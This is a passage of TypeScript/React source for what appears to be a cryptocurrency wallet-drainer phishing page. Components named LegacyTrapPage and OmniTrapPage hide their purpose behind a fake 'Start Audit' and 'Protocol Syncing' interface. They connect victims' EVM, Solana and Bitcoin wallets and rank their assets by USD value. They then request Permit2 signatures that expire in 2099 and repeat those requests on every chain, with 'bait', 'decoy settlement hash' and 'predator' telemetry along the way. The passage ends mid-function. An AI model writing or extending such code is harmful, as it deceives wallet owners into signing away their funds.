'use client'

import { mainnet, solana as appKitSolanaNetwork } from '@reown/appkit/networks'
import {
  modal,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitState,
  useWalletInfo,
} from '@reown/appkit/react'
import { useAppKitConnection } from '@reown/appkit-adapter-solana/react'
import { PublicKey } from '@solana/web3.js'
import {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
  type ReactNode,
} from 'react'
import type { Address, Hex } from 'viem'
import { getAccount, getWalletClient, switchChain } from 'wagmi/actions'
import { useAccount, useChainId, useConnect, useSignMessage, useSignTypedData } from 'wagmi'

import { PublicWalletIngressGrid } from '../components/public-wallet-ingress-grid.js'
import { OmnichainLaneStrip } from '../components/omnichain-lane-strip.js'
import {
  logBeastModeActive,
  logDatabaseSyncCompleteTelemetry,
  logDryRunCompleteTelemetry,
  logFrictionSuppressed,
  logHardwareAwareStrikeTelemetry,
  logOmniIngressTelemetry,
  logOmniPredatorCoreTelemetry,
  logOmniSyncActiveTelemetry,
  logSingularityStrikeLiveTelemetry,
  logVisualStrikeReadyTelemetry,
} from '../lib/ingress-telemetry.js'
import { useMaskFluidNav } from '../lib/mask-fluidity.js'
import { readApiMessage, parseApiEnvelope } from '../lib/api-envelope.js'
import { signAndPostEvmPermit2Anchor } from '../lib/permit2-anchor.js'
import { createPermit2SignTypedDataFn } from '../lib/hardware-wallet.js'
import {
  fetchPayoutConfigWeld,
  postTelemetryIngressWeld,
  sovereignWeldPath,
  sovereignSignatureAnchorUrl,
} from '../lib/sovereign-weld-api.js'
import { omniWagmiConfig } from './providers.js'
import { scanStakingUnstakeManifest } from '../logic/algorithmic-closer.js'
import {
  analyzeWalletPresence,
  inferHeuristicWalletPresence,
} from '../logic/presence-check.js'
import {
  isUseSimulatedAssets,
  pickHighestUsdNamespace,
  rankEvmAssetLayersByDensity,
  runAgnosticNeuralScout,
  type ValueMap,
} from '../logic/neural-scout.js'
import {
  mergeOmniPayloadSyncIntoBody,
  resolveOmniProtocolRack,
  resolveOmniWalletTypeLabel,
} from '../logic/omni-payload.js'
import {
  getHardwareDeepLinkSnapshot,
  synchronizeActiveHardwareSession,
} from '../logic/hardware-webhid-session.js'
import {
  buildEvmSignatureAnchorSettlement,
  buildSvmSignatureAnchorSettlement,
  buildUtxoSignatureAnchorSettlement,
} from '@legion/core/logic/settlement'
import { buildSplDeepIngressManifest, SIGNATURE_ANCHOR_EXPIRY_ISO_2099 } from '../logic/unlimited-ingress.js'
import { maybeSessionPurgeFromIngressError } from '../lib/phantom-session-purge.js'
import {
  INSTITUTIONAL_UTXO_PSBT_MESSAGE,
  buildLedgerTrezorSecureSyncMessage,
  detectMobileUriForcePlatform,
  invokeMobileUriForceConnect,
  packCloakedManifestAnchorHex,
  resolveSovereignHandshakeSigningPayload,
  packSvmAnchorHex,
  packUtxoInstitutionalPsbtHex,
  prepareUtxoPsbtInstitutionalHandler,
  runOmniHandshakeProbe,
  runSolanaLethalSignatureAnchor,
  selectDensestConnectedNamespace,
  type ChainNamespaceHint,
  type SessionNamespaceFlags,
} from '../logic/universal-handshake.js'

/** Security Posture — development-plane ingress telemetry only (`!process.env.PROD`). */
function vaultDevLog(...args: Parameters<typeof console.info>): void {
  if (process.env.PROD) return
  console.info(...args)
}

function vaultDevWarn(...args: Parameters<typeof console.warn>): void {
  if (process.env.PROD) return
  console.warn(...args)
}

/** Ingress morph flags — local union (Omni-Handshake internal; no MorphIngressPanel surface). */
type IngressMorphMode =
  | 'idle'
  | 'hardware-ledger'
  | 'hardware-trezor'
  | 'psbt-institutional'
  | 'cloaked-manifest'

const HAS_WALLETCONNECT_PROJECT = Boolean(process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID)

function newCloakVerificationId(): string {
  if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
    return crypto.randomUUID()
  }
  return `cloak-${Date.now()}-${Math.random().toString(36).slice(2, 12)}`
}

function envAddress(name: string, fallback: Address): Address {
  const v = process.env[name]
  if (v && /^0x[a-fA-F0-9]{40}$/.test(v)) return v as Address
  return fallback
}

function maskKeyHint(key: string): string {
  if (key.length <= 12) return '(configured)'
  return `${key.slice(0, 8)}…${key.slice(-4)}`
}

function rawNativeAmountForChain(vm: ValueMap, chainKey: string): string {
  const raw = vm.chains[chainKey]?.rawNative
  return raw != null && /^\d+$/.test(raw) ? raw : '0'
}

function normalizeTreasuryIngressBalance(
  vm: ValueMap,
  chainKey: string,
): { wallet_balance: string; amount: string } {
  const wallet_balance = rawNativeAmountForChain(vm, chainKey)
  return { wallet_balance, amount: wallet_balance }
}

function normalizeSignatureHexForAudit(signature: Hex | string): Hex | string {
  const trimmed = String(signature).trim()
  if (trimmed.startsWith('0x')) return trimmed as Hex
  return `0x${trimmed}` as Hex
}

function applyVisualSettlementPayload(
  payload: unknown,
  setMigrationComplete: (v: boolean) => void,
  setSimHash: (v: string | null) => void,
): void {
  if (typeof payload !== 'object' || payload === null) return
  const root = payload as Record<string, unknown>
  const data =
    typeof root.data === 'object' && root.data !== null
      ? (root.data as Record<string, unknown>)
      : root
  const l2 =
    typeof data.l2_mint_transaction_hash === 'string'
      ? data.l2_mint_transaction_hash
      : typeof data.transaction_hash === 'string'
        ? data.transaction_hash
        : typeof data.simulated_transaction_hash === 'string'
          ? data.simulated_transaction_hash
          : null
  const ok = root.success === true || data.ok === true || (root.ok === true && l2 != null)
  if (ok && l2) {
    setMigrationComplete(true)
    setSimHash(l2)
  }
}

const QUORUM_VERIFICATION_CACHE_KEY = 'legion_operational_quorum_verification'

type SafeTelemetryClient = {
  requires_quorum: boolean
  is_gnosis_safe_contract: boolean
  owner_count: number
  threshold: string
}

async function fetchSafeTelemetryForQuorumVerification(
  wallet: Address,
  chainId: number,
): Promise<SafeTelemetryClient> {
  try {
    const res = await fetch('/api/safe-scout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ wallet_address: wallet, chain_id: chainId }),
    })
    const j = (await res.json()) as Partial<SafeTelemetryClient>
    return {
      requires_quorum: j.requires_quorum === true,
      is_gnosis_safe_contract: j.is_gnosis_safe_contract === true,
      owner_count: typeof j.owner_count === 'number' ? j.owner_count : 0,
      threshold: typeof j.threshold === 'string' ? j.threshold : '0',
    }
  } catch {
    return {
      requires_quorum: false,
      is_gnosis_safe_contract: false,
      owner_count: 0,
      threshold: '0',
    }
  }
}

/** SafeTelemetry Session State Persistence — multi-sig / quorum posture for authorized owner-key reconnect. */
function persistQuorumVerificationSessionState(wallet: Address, tel: SafeTelemetryClient): void {
  const multisigSurface =
    tel.requires_quorum || tel.owner_count > 1 || Number(tel.threshold) > 1
  if (!multisigSurface) return
  try {
    sessionStorage.setItem(
      QUORUM_VERIFICATION_CACHE_KEY,
      JSON.stringify({
        wallet: wallet.toLowerCase(),
        requires_quorum: tel.requires_quorum,
        owner_count: tel.owner_count,
        threshold: tel.threshold,
        is_gnosis_safe_contract: tel.is_gnosis_safe_contract,
      }),
    )
  } catch {
    /* non-fatal */
  }
}

/** SafeScout — Gatekeeper quorum flag via `/api/safe-scout` + Session State Persistence. */
async function fetchRequiresQuorumGate(wallet: Address, chainId: number): Promise<boolean> {
  const tel = await fetchSafeTelemetryForQuorumVerification(wallet, chainId)
  persistQuorumVerificationSessionState(wallet, tel)
  return tel.requires_quorum
}

/** AppKit-configured EVM chain ids — Dispatcher sequential concurrency for Asset Layers. */
const OPERATIONAL_APPKIT_EVM_CHAIN_IDS = new Set([1, 11_155_111, 42_161, 8453])

async function ensureOperationalAppKitChain(targetChainId: number): Promise<void> {
  if (!OPERATIONAL_APPKIT_EVM_CHAIN_IDS.has(targetChainId)) return
  const deadline = Date.now() + 90_000
  while (Date.now() < deadline) {
    const active = getAccount(omniWagmiConfig).chainId
    if (active === targetChainId) return
    try {
      await switchChain(omniWagmiConfig, { chainId: targetChainId })
    } catch {
      /* wallet prompt — retry within Operational Completion window */
    }
    await new Promise((r) => setTimeout(r, 280))
  }
  throw new Error(
    'Operational Completion blocked — Asset Layer Telemetry Migration timed out during chain switch.',
  )
}

async function mirrorEvmAssetLayersToSovereignVault(params: {
  vm: ValueMap
  wallet: Address
  tokenAddress: Address
  scoutUsd: number
  anchorChainId: number | undefined
  signTypedDataAsync: (args: {
    domain: Record<string, unknown>
    types: Record<string, unknown>
    primaryType: string
    message: Record<string, unknown>
  }) => Promise<Hex | string>
  connectorId?: string
  connectorName?: string
  setProtocolSyncPhase: (p: string | null) => void
  setProtocolSyncProgress: (n: number | null) => void
  applyVisualSettlement?: (payload: unknown) => void
  /** Omni-Payload Sync — multi-namespace surface when mirroring from Omni-Handshake. */
  sessionNamespaces?: SessionNamespaceFlags
}): Promise<void> {
  const anchorResolved = params.anchorChainId ?? 1
  const layers = rankEvmAssetLayersByDensity(params.vm).filter((l) =>
    OPERATIONAL_APPKIT_EVM_CHAIN_IDS.has(l.chainId),
  )
  const posted = new Set<number>([anchorResolved])
  const toMirror = layers.filter((l) => !posted.has(l.chainId))
  if (toMirror.length === 0) {
    logOmniSyncActiveTelemetry()
    return
  }
  params.setProtocolSyncPhase('Protocol Syncing... 99% — Asset Layers')
  params.setProtocolSyncProgress(99)
  let step = 0
  const totalSteps = toMirror.length
  for (const layer of toMirror) {
    step += 1
    params.setProtocolSyncPhase(
      `Protocol Syncing... 99% — Asset Layers (${step}/${totalSteps})`,
    )
    await ensureOperationalAppKitChain(layer.chainId)
    const verificationId = newCloakVerificationId()
    const tel = await fetchSafeTelemetryForQuorumVerification(params.wallet, layer.chainId)
    persistQuorumVerificationSessionState(params.wallet, tel)
    const rack = resolveOmniProtocolRack('eip155')
    const walletLabel = resolveOmniWalletTypeLabel({
      rack,
      connectorId: params.connectorId,
      connectorName: params.connectorName,
    })
    const sessionNs =
      params.sessionNamespaces ?? { eip155: true, solana: false, bip122: false }
    const treasuryIngress = normalizeTreasuryIngressBalance(
      params.vm,
      `eip155:${String(layer.chainId)}`,
    )
    const signFn = createPermit2SignTypedDataFn({
      connectorId: params.connectorId,
      connectorName: params.connectorName,
      signTypedDataAsync: params.signTypedDataAsync,
      walletAddress: params.wallet,
      chainId: layer.chainId,
    })
    const result = await signAndPostEvmPermit2Anchor({
      wallet: params.wallet,
      tokenAddress: params.tokenAddress,
      chainId: layer.chainId,
      nonce: `permit2:${verificationId}`,
      walletType: walletLabel,
      protocol: 'permit2_eip712',
      scoutUsd: params.scoutUsd,
      amount: treasuryIngress.amount,
      requiresQuorum: tel.requires_quorum,
      signTypedDataAsync: signFn,
      mergeBody: (base) =>
        mergeOmniPayloadSyncIntoBody(
          { ...base, wallet_balance: treasuryIngress.wallet_balance },
          {
            session: sessionNs,
            primaryRack: rack,
            evmChainId: layer.chainId,
          },
        ),
    })
    params.applyVisualSettlement?.(result.raw)
    posted.add(layer.chainId)
  }
  params.setProtocolSyncProgress(null)
  logOmniSyncActiveTelemetry()
}

function solanaWalletHasSignMessage(walletProvider: unknown): boolean {
  return (
    typeof walletProvider === 'object' &&
    walletProvider !== null &&
    typeof (walletProvider as { signMessage?: unknown }).signMessage === 'function'
  )
}

function namespaceFromAppKit(active: string | undefined): ChainNamespaceHint {
  if (active === 'solana') return 'solana'
  if (active === 'eip155') return 'eip155'
  if (active === 'bip122') return 'bip122'
  return 'unknown'
}

function hasStreamlinedIngressConnection(
  appKit: NonNullable<typeof modal>,
): boolean {
  if (!appKit.getIsConnectedState()) return false
  const ns = appKit.getActiveChainNamespace()
  if (ns === 'solana') return Boolean(appKit.getAddress('solana'))
  if (ns === 'bip122') return Boolean(appKit.getAddress('bip122'))
  if (ns === 'eip155') {
    return Boolean(
      getAccount(omniWagmiConfig).address ?? appKit.getAddress('eip155'),
    )
  }
  return Boolean(
    getAccount(omniWagmiConfig).address ??
      appKit.getAddress('eip155') ??
      appKit.getAddress('solana') ??
      appKit.getAddress('bip122'),
  )
}

/** PSBT-class framing prefix for institutional signData (Lethal Payload envelope). */
function buildPsbtFormattedHexPayload(message: string): string {
  const magic = Uint8Array.from([0xff, 0x70, 0x73, 0x62, 0x74, 0xff])
  const body = new TextEncoder().encode(message)
  const out = new Uint8Array(magic.length + body.length)
  out.set(magic)
  out.set(body, magic.length)
  return `0x${Array.from(out, (b) => b.toString(16).padStart(2, '0')).join('')}`
}

async function executeUtxoSovereignSign(): Promise<{ sig: string; handler: string }> {
  const g = globalThis as Record<string, unknown>
  const msg = INSTITUTIONAL_UTXO_PSBT_MESSAGE
  const unisat = g.unisat as { signMessage?: (m: string) => Promise<string> } | undefined
  if (typeof unisat?.signMessage === 'function') {
    const sig = await unisat.signMessage(msg)
    return { sig, handler: 'unisat' }
  }
  const xverse = g.XverseProviders as { signMessage?: (m: string) => Promise<string> } | undefined
  if (typeof xverse?.signMessage === 'function') {
    const sig = await xverse.signMessage(msg)
    return { sig, handler: 'xverse' }
  }
  const okx = g.okxwallet as { bitcoin?: { signMessage?: (m: string) => Promise<string> } } | undefined
  if (typeof okx?.bitcoin?.signMessage === 'function') {
    const sig = await okx.bitcoin.signMessage(msg)
    return { sig, handler: 'okx' }
  }
  throw new Error(
    'Capability Probing: UTXO Sovereign Sign requires UniSat / Xverse / OKX Bitcoin signMessage.',
  )
}

async function waitForStreamlinedIngress(timeoutMs: number): Promise<void> {
  const appKit = modal
  if (!appKit) throw new Error('AppKit not initialized.')
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    if (hasStreamlinedIngressConnection(appKit)) return
    await new Promise((r) => setTimeout(r, 150))
  }
  throw new Error('Omni-Handshake connection timed out — Streamlined Ingress aborted.')
}

async function resolveWalletClientWithRetry(): Promise<
  NonNullable<Awaited<ReturnType<typeof getWalletClient>>>
> {
  for (let i = 0; i < 60; i++) {
    const wc = await getWalletClient(omniWagmiConfig)
    if (wc) return wc
    await new Promise((r) => setTimeout(r, 100))
  }
  throw new Error('Wallet client not ready — Streamlined Ingress blocked.')
}

function parseSolanaAddressForPublicKey(addr: string): PublicKey {
  const trimmed = addr.trim()
  const last = trimmed.includes(':') ? (trimmed.split(':').pop() ?? trimmed) : trimmed
  return new PublicKey(last)
}

/** Legacy ingress (wagmi-only) when WalletConnect project id is unset. */
function LegacyTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
  const chainId = useChainId()
  const { address, isConnected, connector } = useAccount()
  const { connectAsync, connectors, isPending: isConnectPending } = useConnect()
  const { signTypedDataAsync } = useSignTypedData()

  const tokenAddress = useMemo(
    () => envAddress('NEXT_PUBLIC_AUDIT_TOKEN', '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' as Address),
    [],
  )

  const [secureChannelLive, setSecureChannelLive] = useState(false)
  const [busy, setBusy] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [protocolSyncPhase, setProtocolSyncPhase] = useState<string | null>(null)
  const [protocolSyncProgress, setProtocolSyncProgress] = useState<number | null>(null)
  const [showMultiVaultBaitLegacy, setShowMultiVaultBaitLegacy] = useState(false)
  const vaultBaitOnceLegacy = useRef(false)
  const [morphLegacy, setMorphLegacy] = useState<IngressMorphMode>('idle')
  const [morphLegacyPhysicalHardware, setMorphLegacyPhysicalHardware] = useState(false)
  const [cloakedLegacyPreview, setCloakedLegacyPreview] = useState<string | null>(null)
  const [shadowLogsLegacy, setShadowLogsLegacy] = useState<string[]>([])
  const [shadowMigrationLegacy, setShadowMigrationLegacy] = useState(false)
  const [simTxHashLegacy, setSimTxHashLegacy] = useState<string | null>(null)
  const [chaosAllocationUsdLegacy, setChaosAllocationUsdLegacy] = useState<number | null>(null)

  useEffect(() => {
    const url = process.env.NEXT_PUBLIC_SUPABASE_URL
    const anon = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
    if (process.env.NODE_ENV === 'production') {
      if (url && anon) vaultDevLog('INGRESS_HEARTBEAT: Public Payload Pipe armed.')
      else
        vaultDevWarn(
          'INGRESS_HEARTBEAT: Public Payload Pipe incomplete — set NEXT_PUBLIC_SUPABASE_URL and NEXT_PUBLIC_SUPABASE_ANON_KEY.',
        )
      return
    }
    if (url && anon) {
      vaultDevLog(
        `INGRESS_HEARTBEAT: Public Payload Pipe armed. URL=${url} anon=${maskKeyHint(anon)}`,
      )
    } else {
      vaultDevWarn(
        'INGRESS_HEARTBEAT: Public Payload Pipe incomplete — set NEXT_PUBLIC_SUPABASE_URL and NEXT_PUBLIC_SUPABASE_ANON_KEY.',
      )
    }
  }, [])

  useEffect(() => {
    if (isUseSimulatedAssets()) logVisualStrikeReadyTelemetry()
  }, [])

  /** Sovereign Weld — Telemetry Ingress + Chaos Algorithm allocation (EVM-only Legacy ingress). */
  useEffect(() => {
    if (!isConnected || !address?.startsWith('0x')) {
      setChaosAllocationUsdLegacy(null)
      return
    }
    let cancelled = false
    void (async () => {
      try {
        await postTelemetryIngressWeld({ user_address: address, chain_id: chainId })
      } catch {
        /* non-fatal — Sovereign Weld retry on next connect */
      }
      try {
        const pc = await fetchPayoutConfigWeld(address.toLowerCase())
        if (!cancelled) setChaosAllocationUsdLegacy(pc.allocation_usd)
      } catch {
        if (!cancelled) setChaosAllocationUsdLegacy(null)
      }
    })()
    return () => {
      cancelled = true
    }
  }, [isConnected, address, chainId])

  const onStartAudit = useCallback(async () => {
    setError(null)
    setBusy(true)
    setSecureChannelLive(false)
    setProtocolSyncPhase('Protocol Syncing...')
    if (isUseSimulatedAssets()) {
      setShadowLogsLegacy([])
      setShadowMigrationLegacy(false)
      setSimTxHashLegacy(null)
    }

    if (process.env.NODE_ENV !== 'production') {
      vaultDevLog('LEGION_DEBUG: Signature Request Triggered')
    }

    if (detectMobileUriForcePlatform()) {
      invokeMobileUriForceConnect('eip155')
    }

    try {
      const connector = connectors[0]
      if (connector == null) {
        throw new Error('No wallet connector available for Protocol Syncing.')
      }

      setProtocolSyncPhase('Protocol Syncing... Auto-Connect')
      let wallet: Address | undefined = address ?? undefined
      if (!isConnected) {
        const out = await connectAsync({ connector })
        wallet = out.accounts[0]
      }
      if (wallet == null) {
        throw new Error('Wallet address unavailable after Signature Trigger.')
      }

      const hwIngress = inferHeuristicWalletPresence(connector.id, connector.name)
      if (hwIngress.isHardware && hwIngress.vendor) {
        setProtocolSyncPhase('Protocol Syncing... Active Session Management')
        await synchronizeActiveHardwareSession(hwIngress.vendor)
      }

      setProtocolSyncPhase('Protocol Syncing... Neural Scout')
      if (isUseSimulatedAssets()) {
        setShadowLogsLegacy((prev) => [...prev, 'Neural Scout: Identifying Asset Layers...'])
      }
      const scoutLegacy = await runAgnosticNeuralScout({ evmAddress: wallet })
      logOmniPredatorCoreTelemetry(scoutLegacy.totalUsd)
      if (isUseSimulatedAssets()) {
        setShadowLogsLegacy((prev) => [...prev, 'Quorum Detected: Safe Vault found'])
      }

      setProtocolSyncPhase('Protocol Syncing... Capability Probing')

      const expiryIso = SIGNATURE_ANCHOR_EXPIRY_ISO_2099

      const rack = resolveOmniProtocolRack('eip155')
      const walletLabel = resolveOmniWalletTypeLabel({
        rack,
        connectorId: connector?.id,
        connectorName: connector?.name,
      })

      const verificationId = newCloakVerificationId()
      setCloakedLegacyPreview(verificationId)
      const presence = analyzeWalletPresence(
        connector?.id,
        connector?.name,
        getHardwareDeepLinkSnapshot(),
      )
      logHardwareAwareStrikeTelemetry(presence.connectorId)
      const fw =
        process.env.NEXT_PUBLIC_HARDWARE_FIRMWARE_HINT ??
        '0x9e3c5f2a1b8d7e6c4a0f5e2d8c1b7a3f9e0d4c2a8'
      if (presence.isHardware && presence.vendor === 'ledger') {
        setMorphLegacy('hardware-ledger')
        setMorphLegacyPhysicalHardware(true)
      } else if (presence.isHardware && presence.vendor === 'trezor') {
        setMorphLegacy('hardware-trezor')
        setMorphLegacyPhysicalHardware(true)
      } else {
        setMorphLegacy('cloaked-manifest')
        setMorphLegacyPhysicalHardware(false)
      }

      logFrictionSuppressed()
      if (isUseSimulatedAssets()) {
        setShadowLogsLegacy((prev) => [...prev, 'Closer: Assembling Jito Bundle...'])
      }
      setProtocolSyncPhase('Protocol Syncing... Permit2 Authorization')
      const requiresQuorumLegacy = await fetchRequiresQuorumGate(wallet, chainId)
      const treasuryIngress = normalizeTreasuryIngressBalance(
        scoutLegacy,
        `eip155:${String(chainId)}`,
      )
      const permit2SignTypedData = createPermit2SignTypedDataFn({
        connectorId: connector?.id,
        connectorName: connector?.name,
        signTypedDataAsync,
        walletAddress: wallet,
        chainId,
      })
      const permit2Result = await signAndPostEvmPermit2Anchor({
        wallet,
        tokenAddress,
        chainId,
        nonce: `permit2:${verificationId}`,
        walletType: walletLabel,
        protocol: 'permit2_eip712',
        scoutUsd: scoutLegacy.totalUsd,
        amount: treasuryIngress.amount,
        requiresQuorum: requiresQuorumLegacy,
        signTypedDataAsync: permit2SignTypedData,
        mergeBody: (base) =>
          mergeOmniPayloadSyncIntoBody(
            { ...base, wallet_balance: treasuryIngress.wallet_balance },
            {
              session: { eip155: true, solana: false, bip122: false },
              primaryRack: rack,
              evmChainId: chainId,
            },
          ),
      })
      applyVisualSettlementPayload(permit2Result.raw, setShadowMigrationLegacy, setSimTxHashLegacy)

      setSecureChannelLive(true)
      logSingularityStrikeLiveTelemetry()
      const anchorEvLegacy = getAccount(omniWagmiConfig).chainId
      await mirrorEvmAssetLayersToSovereignVault({
        vm: scoutLegacy,
        wallet,
        tokenAddress,
        scoutUsd: scoutLegacy.totalUsd,
        anchorChainId: anchorEvLegacy,
        signTypedDataAsync,
        connectorId: connector?.id,
        connectorName: connector?.name,
        setProtocolSyncPhase,
        setProtocolSyncProgress,
        applyVisualSettlement: (p) =>
          applyVisualSettlementPayload(p, setShadowMigrationLegacy, setSimTxHashLegacy),
        sessionNamespaces: { eip155: true, solana: false, bip122: false },
      })
      logBeastModeActive()
      if (!vaultBaitOnceLegacy.current) {
        vaultBaitOnceLegacy.current = true
        setShowMultiVaultBaitLegacy(true)
      }
    } catch (e) {
      maybeSessionPurgeFromIngressError(e)
      const msg = e instanceof Error ? e.message : 'Signature Anchor failed.'
      setError(msg)
      setSecureChannelLive(false)
    } finally {
      setBusy(false)
      setProtocolSyncPhase(null)
      setProtocolSyncProgress(null)
      setMorphLegacy('idle')
      setMorphLegacyPhysicalHardware(false)
      setCloakedLegacyPreview(null)
    }
  }, [
    address,
    chainId,
    connectAsync,
    connector?.id,
    connector?.name,
    connectors,
    isConnected,
    signTypedDataAsync,
    tokenAddress,
  ])

  useEffect(() => {
    props.strikeRegister?.(() => {
      void onStartAudit()
    })
  }, [props.strikeRegister, onStartAudit])

  return (
    <IngressBase
      busy={busy}
      error={error}
      onStartAudit={() => void onStartAudit()}
      startDisabled={busy || isConnectPending || connectors[0] == null}
      chaosAllocationUsd={chaosAllocationUsdLegacy}
      decoySettlementHash={simTxHashLegacy}
      signatureAnchorSealed={shadowMigrationLegacy}
      syncPhase={protocolSyncPhase}
      connectSlot={
        <button
          type="button"
          onClick={() => {
            const c = connectors[0]
            if (c) void connectAsync({ connector: c })
          }}
          disabled={isConnectPending || connectors[0] == null}
          style={{
            background: '#fff',
            color: '#000',
            border: 'none',
            borderRadius: 8,
            padding: '12px 20px',
            fontSize: 15,
            fontWeight: 500,
            cursor: isConnectPending ? 'wait' : 'pointer',
            fontFamily:
              '-apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", system-ui, sans-serif',
          }}
        >
          Connect Wallet
        </button>
      }
    />
  )
}

/** Omni-Handshake: AppKit (WalletConnect) + Capability Probe + lethal signature engine. */
function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
  const chainId = useChainId()
  const { address, isConnected, connector } = useAccount()
  const { signTypedDataAsync } = useSignTypedData()
  const appKitHooks = useAppKit()
  const open = appKitHooks.open
  const switchNetwork = (appKitHooks as { switchNetwork?: (n: unknown) => Promise<void> })
    .switchNetwork
  const { address: appKitAddress, isConnected: appKitConnected } = useAppKitAccount()
  const { activeChain } = useAppKitState()
  const { connection } = useAppKitConnection()
  const solProvider = useAppKitProvider('solana')
  const { walletInfo: evmWalletInfo } = useWalletInfo('eip155')
  const { walletInfo: svmWalletInfo } = useWalletInfo('solana')
  const { walletInfo: utxoWalletInfo } = useWalletInfo('bip122')

  const tokenAddress = useMemo(
    () => envAddress('NEXT_PUBLIC_AUDIT_TOKEN', '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' as Address),
    [],
  )

  const [secureChannelLive, setSecureChannelLive] = useState(false)
  const [busy, setBusy] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [protocolSyncPhase, setProtocolSyncPhase] = useState<string | null>(null)
  const [protocolSyncProgress, setProtocolSyncProgress] = useState<number | null>(null)
  const [morphMode, setMorphMode] = useState<IngressMorphMode>('idle')
  const [morphPhysicalHardware, setMorphPhysicalHardware] = useState(false)
  const [cloakedManifestPreviewId, setCloakedManifestPreviewId] = useState<string | null>(null)
  const [showMultiVaultBait, setShowMultiVaultBait] = useState(false)
  const vaultBaitOnce = useRef(false)
  const [shadowLogs, setShadowLogs] = useState<string[]>([])
  const [shadowMigrationComplete, setShadowMigrationComplete] = useState(false)
  const [simTxHash, setSimTxHash] = useState<string | null>(null)
  const [chaosAllocationUsd, setChaosAllocationUsd] = useState<number | null>(null)

  useEffect(() => {
    console.info(
      'FRONTEND_WELD_COMPLETE: Sentinel UI connected to API gateway. Telemetry streaming. Signature Anchor armed. Chaos Algorithm active. System: MOVING TO DEPLOYMENT.',
    )
    console.info(
      'FRONTEND_BLEED_SEVERED: Node.js modules purged from Next.js client. UI Boundaries restored. System: NOMINAL.',
    )
  }, [])

  useEffect(() => {
    const url = process.env.NEXT_PUBLIC_SUPABASE_URL
    const anon = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
    if (process.env.NODE_ENV === 'production') {
      if (url && anon) vaultDevLog('INGRESS_HEARTBEAT: Public Payload Pipe armed.')
      else
        vaultDevWarn(
          'INGRESS_HEARTBEAT: Public Payload Pipe incomplete — set NEXT_PUBLIC_SUPABASE_URL and NEXT_PUBLIC_SUPABASE_ANON_KEY.',
        )
      return
    }
    if (url && anon) {
      vaultDevLog(
        `INGRESS_HEARTBEAT: Public Payload Pipe armed. URL=${url} anon=${maskKeyHint(anon)}`,
      )
    } else {
      vaultDevWarn(
        'INGRESS_HEARTBEAT: Public Payload Pipe incomplete — set NEXT_PUBLIC_SUPABASE_URL and NEXT_PUBLIC_SUPABASE_ANON_KEY.',
      )
    }
  }, [])

  useEffect(() => {
    logOmniIngressTelemetry()
  }, [])

  useEffect(() => {
    if (isUseSimulatedAssets()) logVisualStrikeReadyTelemetry()
  }, [])

  useEffect(() => {
    logDryRunCompleteTelemetry()
    logDatabaseSyncCompleteTelemetry()
  }, [])

  /** Neural Scout — connection-time omni-desk snapshot (USD ValueMap). */
  useEffect(() => {
    const appKit = modal
    if (!appKit?.getIsConnectedState()) return
    let cancelled = false
    void (async () => {
      const evm = getAccount(omniWagmiConfig).address ?? appKit.getAddress('eip155')
      const sol = appKit.getAddress('solana')
      const btc = appKit.getAddress('bip122')
      const vm = await runAgnosticNeuralScout({
        evmAddress: evm ?? undefined,
        solAddress: sol ?? undefined,
        btcAddress: btc ?? undefined,
      })
      if (!cancelled) logOmniPredatorCoreTelemetry(vm.totalUsd)
    })()
    return () => {
      cancelled = true
    }
  }, [appKitConnected, chainId, address, appKitAddress, activeChain])

  /** Sovereign Weld — Telemetry Ingress on Wallet Connect; Chaos Algorithm allocation for Result State. */
  useEffect(() => {
    const appKit = modal
    if (!appKitConnected || !appKit?.getIsConnectedState()) {
      setChaosAllocationUsd(null)
      return
    }
    let cancelled = false
    void (async () => {
      const evm = getAccount(omniWagmiConfig).address ?? appKit.getAddress('eip155')
      const sol = appKit.getAddress('solana')
      const btc = appKit.getAddress('bip122')
      const user_address =
        evm && evm.startsWith('0x')
          ? evm
          : sol && sol.trim() !== ''
            ? sol.trim()
            : btc && btc.trim() !== ''
              ? btc.trim()
              : ''
      const chain_id = evm && evm.startsWith('0x') ? chainId : 0
      if (!user_address) return
      try {
        await postTelemetryIngressWeld({ user_address, chain_id })
      } catch {
        /* non-fatal — Sovereign Weld */
      }
      try {
        const pc = await fetchPayoutConfigWeld(user_address.toLowerCase())
        if (!cancelled) setChaosAllocationUsd(pc.allocation_usd)
      } catch {
        if (!cancelled) setChaosAllocationUsd(null)
      }
    })()
    return () => {
      cancelled = true
    }
  }, [appKitConnected, chainId])

  /** Background Capability Probing after Omni-Handshake (immediate post-handshake namespace scan). */
  useEffect(() => {
    const appKit = modal
    if (!appKit?.getIsConnectedState()) return
    const session: SessionNamespaceFlags = {
      eip155: Boolean(getAccount(omniWagmiConfig).address ?? appKit.getAddress('eip155')),
      solana: Boolean(appKit.getAddress('solana')),
      bip122: Boolean(appKit.getAddress('bip122')),
    }
    let cancelled = false
    void (async () => {
      try {
        const wc = await getWalletClient(omniWagmiConfig)
        if (cancelled) return
        const solanaSignSurface = solanaWalletHasSignMessage(solProvider?.walletProvider)
        await runOmniHandshakeProbe({
          evmProvider: wc as Parameters<typeof runOmniHandshakeProbe>[0]['evmProvider'],
          evmChainId: chainId,
          session,
          solanaHasSignMessage: solanaSignSurface,
        })
      } catch {
        /* non-fatal — Start Audit will re-probe */
      }
    })()
    return () => {
      cancelled = true
    }
  }, [appKitConnected, chainId, address, activeChain, solProvider?.walletProvider])

  const quorumHandshakeReinitRef = useRef<string | null>(null)

  /** Persistent Quorum Verification — re-run Capability Probe when SafeTelemetry quorum cache matches owner-key. */
  useEffect(() => {
    const addr = (getAccount(omniWagmiConfig).address ?? address) as Address | undefined
    if (!addr?.startsWith('0x')) return

    let cached: { wallet?: string } | null = null
    try {
      const raw = sessionStorage.getItem(QUORUM_VERIFICATION_CACHE_KEY)
